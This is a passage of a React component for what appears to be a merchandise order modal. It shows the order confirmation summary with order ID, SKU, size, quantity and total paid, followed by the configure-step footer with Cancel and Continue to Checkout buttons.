            </div>

            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono p-4 rounded-xl bg-[#08142b] border border-blue-900/60 tabular-nums">
              <div>
                <span className="text-[10px] text-slate-400 uppercase block">Order ID</span>
                <span className="text-white font-bold">{confirmedOrder.orderId}</span>
              </div>
              <div>
                <span className="text-[10px] text-slate-400 uppercase block">SKU Reference</span>
                <span className="text-blue-300 font-bold">{confirmedOrder.reservationVin}</span>
              </div>
              <div>
                <span className="text-[10px] text-slate-400 uppercase block">Size &amp; Qty</span>
                <span className="text-white font-bold">
                  {confirmedOrder.merchSize} · ×{confirmedOrder.merchQuantity}
                </span>
              </div>
              <div>
                <span className="text-[10px] text-slate-400 uppercase block">Total Paid</span>
                <span className="text-emerald-300 font-bold">${confirmedOrder.totalPrice.toLocaleString()}</span>
              </div>
            </div>

            <div className="flex flex-wrap items-center justify-end gap-3 pt-2">
              {onOpenInbox && (
                <button
                  type="button"
                  onClick={() => {
                    onClose();
                    onOpenInbox();
                  }}
                  className="px-4 py-2.5 rounded-xl bg-[#08142b] border border-blue-500/45 text-blue-200 hover:text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
                >
                  <Mail className="w-4 h-4" />
                  <span>Open In-App Inbox</span>
                </button>
              )}
              <button
                type="button"
                onClick={onClose}
                className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-red-600 text-white text-xs font-bold cursor-pointer"
              >
                Done
              </button>
            </div>
          </div>
        )}

        {/* Configure Step Footer */}
        {step === 'configure' && (
          <div className="p-4 sm:px-6 border-t border-blue-900/60 bg-[#050d20] flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div className="text-xs font-mono text-slate-300 tabular-nums">
              Selected: <strong className="text-white">{selectedTier.name}</strong> · Size{' '}
              <strong className="text-blue-300">{selectedSize}</strong> ·{' '}
              <strong className="text-white">${totalPrice.toLocaleString()} USD</strong>
            </div>
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={onClose}
                className="px-4 py-2.5 rounded-xl bg-[#08142b] border border-blue-800/70 text-slate-300 hover:text-white text-xs font-mono cursor-pointer"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={() => setStep('checkout')}
                className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold font-mono flex items-center gap-1.5 cursor-pointer shadow-md"
              >
                <span>Continue to Checkout</span>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
